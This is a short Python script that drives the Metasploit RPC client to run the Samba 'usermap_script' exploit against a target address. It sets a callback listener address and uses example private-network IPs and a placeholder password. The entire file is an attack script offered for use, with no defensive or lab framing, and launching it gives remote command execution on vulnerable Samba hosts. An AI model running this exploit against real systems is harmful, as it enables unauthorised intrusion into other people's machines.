from metasploit.msfrpc import MsfRpcClient

def run_metasploit(target_ip, lhost_ip):
    try:
        # Connect to Metasploit
        client = MsfRpcClient('your_password')
        
        # Select module
        exploit = client.modules.use('exploit', 'multi/samba/usermap_script')
        exploit['RHOSTS'] = target_ip
        exploit['LHOST'] = lhost_ip
        
        # Execute the exploit
        exploit.execute()
        
        print(f"Exploit executed against {target_ip}")
    
    except Exception as e:
        print(f"Exception occurred: {e}")

if __name__ == "__main__":
    # Example target information
    target_ip = "192.168.1.10"
    lhost_ip = "192.168.1.100"
    
    # Run Metasploit exploit
    run_metasploit(target_ip, lhost_ip)
